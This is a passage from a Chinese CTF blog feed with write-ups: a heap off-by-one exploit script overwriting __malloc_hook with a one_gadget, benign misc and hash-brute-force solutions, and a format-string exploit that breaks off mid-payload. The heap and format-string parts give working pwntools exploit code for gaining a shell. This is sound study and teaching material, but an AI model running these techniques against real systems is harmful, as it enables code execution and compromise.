class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">malloc_hook = main_arena-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line">libc_base = malloc_hook-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base+gadget[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xd</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xd</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one_gadget)+p64(realloc+<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>详细来解释攻击过程</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)                 chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f72b0                               chunk1</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7320                               chunk2</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7390                               chunk3</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;-- A (index 0)</span><br><span class="line">| chunk A (0x70)       |  # 用来 off-by-one</span><br><span class="line">+----------------------+ &lt;-- B (index 1)</span><br><span class="line">| chunk B (0x70)       |  # 将被改 size=0xe0</span><br><span class="line">+----------------------+ &lt;-- C (index 2)</span><br><span class="line">| chunk C (0x70)       |  # 后面泄露 libc</span><br><span class="line">+----------------------+ &lt;-- D (index 3)</span><br><span class="line">| chunk D (0x70)       |  # 隔离，防合并</span><br><span class="line">+----------------------+</span><br><span class="line">| top chunk ...        |</span><br></pre></td></tr></table></figure>

<ol start="2">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)               chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c932b0</span><br><span class="line">Size: 0xe0 (with flag bits: 0xe1)                chunk1的大小就被改了</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93390                             chunk3</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<p>可以看到chunk1的大小就被改了</p>
<p>怎么改变的呢？</p>
<p>0x18会自动补全成0x20此时覆盖掉了pre size,由于off-by-one,我们写入0xe1就可以覆盖chunk1的size从而改变chunk1的大小。</p>
<p>这样做有什么用？</p>
<p>chunk1大小改变后chunk1的用户区就会覆盖到chunk2的头部。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)  <span class="comment">#free(B) → B(0xe0) 进 unsorted，fd/bk 写入 libc 地址</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd22b0</span><br><span class="line">Size: 0xe0 (with flag bits: 0xe1)</span><br><span class="line">fd: 0x6271fdbd2</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2390</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<p>这里补充一下</p>
<ul>
<li><strong>glibc 的 free 逻辑</strong>（以 2.23 为例）：<ul>
<li>小于等于 <code>0x80</code>（含 chunk header）的空闲块 → 放入 <strong>fastbin</strong>；</li>
<li>大于 <code>0x80</code> 且小于等于 <code>0x400</code> → 放入 <strong>small bin</strong>，但第一次 free 先进入 <strong>unsorted bin</strong>；</li>
<li>更大的 → large bin &#x2F; top chunk。</li>
</ul>
</li>
</ul>
<p>👉 总结：<strong>一个 chunk 进 unsorted 还是 fastbin，取决于它的 size（含 header）</strong></p>
<p>这样做有什么用？</p>
<p>由上一步chunk1的用户区覆盖到chunk2的头部，当 chunk1 进 unsorted 时，glibc 会在这个空闲块的用户区最前面写入 <code>fd/bk</code> 指针，指向 <code>main_arena</code>，<strong>这些指针是 libc 地址</strong>。</p>
<p>由于 chunk1 被“扩成了 0xe0”，它的“用户区”已经<strong>覆盖到 chunk2的头和部分用户区</strong>；于是 <strong>unsorted 的 <code>fd/bk</code> 指针就落在了 C 的用户区</strong>里（<strong>重叠泄露</strong>的关键）</p>
<p>这时 <code>add(0x88)</code> <code>show(2)</code> 将chunk1申请回来再，打印 chunk2，就能读到 <code>main_arena</code> 相关指针，从而泄露 libc。</p>
<p>远程是可以泄露的，但是在本地调试的时候add(0x88)的时候会回直接申请一个新堆块，导致没成功，现在还没找到解决办法，先放这里。</p>
<h2 id="162"><a href="#162" class="headerlink" title="162"></a>162</h2>]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>heap</category>
      </categories>
  </entry>
  <entry>
    <title>春秋杯(2025)</title>
    <url>/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/</url>
    <content><![CDATA[<h1 id="春秋杯（2025）"><a href="#春秋杯（2025）" class="headerlink" title="春秋杯（2025）"></a>春秋杯（2025）</h1><ul>
<li><p><a href="#msic">msic</a></p>
<ul>
<li><a href="#%E7%AE%80%E5%8D%95%E7%AE%97%E6%9C%AF">简单算术</a></li>
<li><a href="#%E5%8E%8B%E5%8A%9B%E5%A4%A7%EF%BC%8C%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%90%A7">压力大，写个脚本吧</a></li>
</ul>
</li>
<li><p><a href="#Crypot">Crypot</a></p>
<ul>
<li><a href="#%E9%80%9A%E5%BE%80%E5%93%88%E5%B8%8C%E7%9A%84%E6%97%85%E7%A8%8B">通往哈希的旅程</a></li>
</ul>
</li>
</ul>
<h2 id="msic"><a href="#msic" class="headerlink" title="msic"></a>msic</h2><h3 id="简单算术"><a href="#简单算术" class="headerlink" title="简单算术"></a>简单算术</h3><p>1.打开附件看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ys~xdg/m@]mjkz@vl@z~lf&gt;b</span><br></pre></td></tr></table></figure>

<p>2.根据题目意思<br>想想异或<br>可以想到异或运算（a^b&#x3D;c,b^c&#x3D;a,a^c&#x3D;b)</p>
<p>一般的flag结尾都是}，先让b和}异或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char a=&#x27;b&#x27;;</span><br><span class="line">	char b=&#x27;&#125;&#x27;;</span><br><span class="line">	char c;</span><br><span class="line">	c=a^b;</span><br><span class="line">	printf(&quot;%d&quot;,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到31</p>
<p>3.再用31依次和字符串异或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	</span><br><span class="line">    char a[]=&quot;ys~xdg/m@]mjkz@vl@z~lf&gt;b&quot;;</span><br><span class="line">    int lenght= strlen(a);</span><br><span class="line">	char b=&#x27;31&#x27;;</span><br><span class="line">	char c[lenght];</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0;i&lt;lenght;i++)&#123;</span><br><span class="line">		c[i]=a[i]^31;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117174125235.png" alt="image-20250117174125235"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x0r_Brute_is_easy!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h3><p>1.发现是一个百层压缩<br>2.解了几次发现都有密码上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_password_from_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;从给定路径的文件中读取Base64编码的密码并解码&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">            encoded_password = file.read().strip()</span><br><span class="line">            password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            return password</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error reading password from &#123;file_path&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def un_zip(path, file_name, password):</span><br><span class="line">    &quot;&quot;&quot;解压ZIP文件到指定路径，并提供密码&quot;&quot;&quot;</span><br><span class="line">    current_file = os.path.join(path, file_name)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(current_file) as zip_file:</span><br><span class="line">            # 获取第一个非隐藏文件的名字作为新的目录名</span><br><span class="line">            for new_file in zip_file.namelist():</span><br><span class="line">                if not (new_file.startswith(&#x27;__MACOSX&#x27;) or new_file.endswith(&#x27;/&#x27;)):</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">            # 创建一个以解压出来的压缩包为名字的新文件夹</span><br><span class="line">            new_path = os.path.join(path, os.path.splitext(file_name)[0])</span><br><span class="line">            os.makedirs(new_path, exist_ok=True)</span><br><span class="line"></span><br><span class="line">            # 解压所有内容到新路径，并提供密码</span><br><span class="line">            zip_file.extractall(path=new_path, pwd=password.encode())</span><br><span class="line"></span><br><span class="line">            return new_path, new_file</span><br><span class="line"></span><br><span class="line">    except RuntimeError as e:</span><br><span class="line">        print(f&quot;RuntimeError: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;An error occurred while unzipping &#123;file_name&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_next_password_file(base_path, last_number):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据上次使用的密码文件数字，在解压后的文件夹中查找下一个密码文件。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    next_number = last_number - 1</span><br><span class="line">    next_password_filename = f&quot;password_&#123;next_number:02&#125;.txt&quot;</span><br><span class="line">    next_password_file_path = os.path.join(base_path, next_password_filename)</span><br><span class="line"></span><br><span class="line">    if os.path.exists(next_password_file_path):</span><br><span class="line">        return next_password_file_path</span><br><span class="line">    else:</span><br><span class="line">        raise FileNotFoundError(f&quot;Next password file &#123;next_password_filename&#125; not found.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解压缩所需的参数</span><br><span class="line">base_path = r&quot;D:\桌面\zip_100&quot;</span><br><span class="line">initial_file_to_unzip = &quot;zip_99.zip&quot;</span><br><span class="line">initial_password_file = os.path.join(base_path, &quot;password_99.txt&quot;)</span><br><span class="line"></span><br><span class="line"># 开始解压过程</span><br><span class="line">current_path = base_path</span><br><span class="line">file_to_unzip = initial_file_to_unzip</span><br><span class="line">last_password_number = 99</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 读取当前密码</span><br><span class="line">        password = read_password_from_file(initial_password_file)</span><br><span class="line"></span><br><span class="line">        # 解压当前ZIP文件</span><br><span class="line">        current_path, new_file = un_zip(current_path, file_to_unzip, password)</span><br><span class="line">        print(f&quot;Unzipped: &#123;new_file&#125; to &#123;current_path&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否还有zip文件需要解压</span><br><span class="line">        if new_file.lower().endswith(&#x27;.zip&#x27;):</span><br><span class="line">            # 更新要解压的文件路径</span><br><span class="line">            file_to_unzip = new_file</span><br><span class="line"></span><br><span class="line">            # 查找下一个密码文件</span><br><span class="line">            next_password_file = find_next_password_file(current_path, last_password_number)</span><br><span class="line">            last_password_number -= 1</span><br><span class="line">            initial_password_file = next_password_file</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Stopped unzipping process due to an error: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&quot;End of unzipping process.&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117174837151.png" alt="image-20250117174837151"></p>
<p>3.发现问题改进下脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_password_from_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;从给定路径的文件中读取Base64编码的密码并解码&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">            encoded_password = file.read().strip()</span><br><span class="line">            password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            return password</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error reading password from &#123;file_path&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def un_zip(path, file_name, password):</span><br><span class="line">    &quot;&quot;&quot;解压ZIP文件到指定路径，并提供密码&quot;&quot;&quot;</span><br><span class="line">    current_file = os.path.join(path, file_name)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(current_file) as zip_file:</span><br><span class="line">            # 创建一个以解压出来的压缩包为名字的新文件夹</span><br><span class="line">            new_path = os.path.join(path, os.path.splitext(file_name)[0])</span><br><span class="line">            os.makedirs(new_path, exist_ok=True)</span><br><span class="line"></span><br><span class="line">            # 解压所有内容到新路径，并提供密码</span><br><span class="line">            zip_file.extractall(path=new_path, pwd=password.encode())</span><br><span class="line"></span><br><span class="line">            return new_path, zip_file.namelist()  # 返回解压的所有文件列表</span><br><span class="line">    except RuntimeError as e:</span><br><span class="line">        print(f&quot;RuntimeError: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;An error occurred while unzipping &#123;file_name&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_next_password_file(base_path, last_number):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据上次使用的密码文件数字，在解压后的文件夹中查找下一个密码文件。</span><br><span class="line">    支持一位数和两位数的文件名。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    next_number = last_number - 1</span><br><span class="line">    for format_str in [&#x27;%d&#x27;, &#x27;%02d&#x27;]:  # 尝试两种格式</span><br><span class="line">        next_password_filename = f&quot;password_&#123;format_str % next_number&#125;.txt&quot;</span><br><span class="line">        next_password_file_path = os.path.join(base_path, next_password_filename)</span><br><span class="line">        if os.path.exists(next_password_file_path):</span><br><span class="line">            return next_password_file_path</span><br><span class="line"></span><br><span class="line">    raise FileNotFoundError(f&quot;Next password file not found for number &#123;next_number&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解压缩所需的参数</span><br><span class="line">base_path = r&quot;D:\桌面\zip_100&quot;</span><br><span class="line">initial_file_to_unzip = &quot;zip_99.zip&quot;</span><br><span class="line">initial_password_file = os.path.join(base_path, &quot;password_99.txt&quot;)</span><br><span class="line"></span><br><span class="line"># 开始解压过程</span><br><span class="line">current_path = base_path</span><br><span class="line">file_to_unzip = initial_file_to_unzip</span><br><span class="line">last_password_number = 99</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 读取当前密码</span><br><span class="line">        password = read_password_from_file(initial_password_file)</span><br><span class="line"></span><br><span class="line">        # 解压当前ZIP文件</span><br><span class="line">        current_path, extracted_files = un_zip(current_path, file_to_unzip, password)</span><br><span class="line">        print(f&quot;Unzipped: &#123;file_to_unzip&#125; to &#123;current_path&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否还有zip文件需要解压</span><br><span class="line">        zip_files = [f for f in extracted_files if f.lower().endswith(&#x27;.zip&#x27;)]</span><br><span class="line">        if zip_files:</span><br><span class="line">            # 更新要解压的文件路径</span><br><span class="line">            file_to_unzip = zip_files[0]  # 假设只有一个ZIP文件被解压出来</span><br><span class="line"></span><br><span class="line">            # 查找下一个密码文件</span><br><span class="line">            next_password_file = find_next_password_file(current_path, last_password_number)</span><br><span class="line">            last_password_number -= 1</span><br><span class="line">            initial_password_file = next_password_file</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Stopped unzipping process due to an error: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&quot;End of unzipping process.&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175112049.png" alt="image-20250117175112049"></p>
<p>完成解压</p>
<p>3.打开最后一个文件</p>
<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175301990.png" alt="image-20250117175301990"></p>
<p>4.可以看到密码加密码和png可以想到把base64都拼在一起可能会得到一个png的图片，拼接后：</p>
<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175558172.png" alt="image-20250117175558172"></p>
<p>5.得到一个二维码：<br><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175629639.png" alt="image-20250117175629639"></p>
<p><a href="https://online-barcode-reader.inliteresearch.com/">在线扫描二维码</a></p>
<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175853810.png" alt="image-20250117175853810"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;_PASSWORDs_is_fl@g!_&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通往哈希的旅程"><a href="#通往哈希的旅程" class="headerlink" title="通往哈希的旅程"></a>通往哈希的旅程</h2><p>1.有题目已知前三位是188，而且是11位</p>
<p>用脚本爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"># 给定的哈希值</span><br><span class="line">given_hash = &#x27;ca12fd8250972ec363a16593356abb1f3cf3a16d&#x27;</span><br><span class="line"></span><br><span class="line"># 检查函数</span><br><span class="line">def check_hash(value):</span><br><span class="line">    # 生成该值的SHA-1哈希</span><br><span class="line">    hash_object = hashlib.sha1(value.encode())</span><br><span class="line">    hex_dig = hash_object.hexdigest()</span><br><span class="line">    return hex_dig == given_hash</span><br><span class="line"></span><br><span class="line"># 尝试所有可能的11位数字组合</span><br><span class="line">for i in range(18800000000, 18900000000):  # 从18800000000到18899999999</span><br><span class="line">    if check_hash(str(i)):</span><br><span class="line">        print(f&quot;Found match: &#123;i&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No match found&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117182920364.png" alt="image-20250117182920364"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18876011645&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title>格式化字符串专题加强</title>
    <url>/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/</url>
    <content><![CDATA[<p>进行格式化字符串专题的加强，先写一个题目，再重温一下知识点进行总结一下。</p>
<h3 id="TGCTF-fmt"><a href="#TGCTF-fmt" class="headerlink" title="TGCTF fmt"></a>TGCTF fmt</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome TGCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your gift %p\n&quot;</span>, buf);   <span class="comment">//泄露出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);    <span class="comment">//没有栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">1131796</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);   <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    magic = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有一个格式化字符串漏洞，也只有一个读入。先去查看一下保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(myenv) linkpwn@linkpwn-VMware-Virtual-Platform:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/linkpwn/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>没有开启pie，canary开启了，但是我们没用到栈溢出，所以我们不用管canary</p>
<p>因此这个题目的攻击思路就是，先利用格式化字符串泄露libc的基地址，然后再利用one_gadget.。</p>
<p>首先我们利用格式化字符串泄露libc的地址，同时也要利用格式化字符串写入one_gadget。</p>
<p>要利用两次格式化字符串的话，我们就不能让函数执行到    magic &#x3D; 0;，所以我们必须把printf_ret的地址覆盖为read的地址，方便下次</p>
<p>的读入。</p>
<p>泄露出libc_start_main+xxx的地址可以计算出libc的基地址。</p>
<p>再用one_get工具查出execve(&#x2F;bin&#x2F;sh)的偏移，在用格式化字符串漏洞将返回地址写成execve(&#x2F;bin&#x2F;sh)的地址就可以getshell了</p>
<p>现在开始正式开始攻击</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 配置与初始化 ================</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 泄露栈地址 ================</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&quot;Stack address: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 第一次格式化字符串攻击：泄露 libc 地址 ================</span></span><br><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>           <span class="comment"># 控制写入低 2 